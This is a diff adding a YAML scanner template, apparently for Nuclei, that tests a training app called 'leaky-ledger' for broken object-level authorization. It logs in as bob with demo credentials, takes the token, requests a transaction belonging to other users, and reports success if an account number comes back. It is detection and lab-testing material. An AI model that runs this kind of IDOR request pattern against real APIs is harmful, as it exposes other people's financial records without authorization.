@@ -1,0 +1,38 @@
+id: leaky-ledger-bola-transaction-detail
+
+info:
+  name: leaky-ledger - BOLA on transaction detail
+  author: leaky-ledger
+  severity: high
+  description: Logs in as bob and reads transaction 2 (alice -> carol), which bob is not part of.
+  classification:
+    cwe-id: CWE-639
+  tags: bola,idor,api,leaky-ledger
+
+http:
+  - raw:
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"username":"bob","password":"bob-pass-1"}
+      - |
+        GET /api/transactions/2 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{token}}
+
+    extractors:
+      - type: json
+        name: token
+        part: body_1
+        internal: true
+        json:
+          - ".token"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "SI56100000000000003")'
+        condition: and
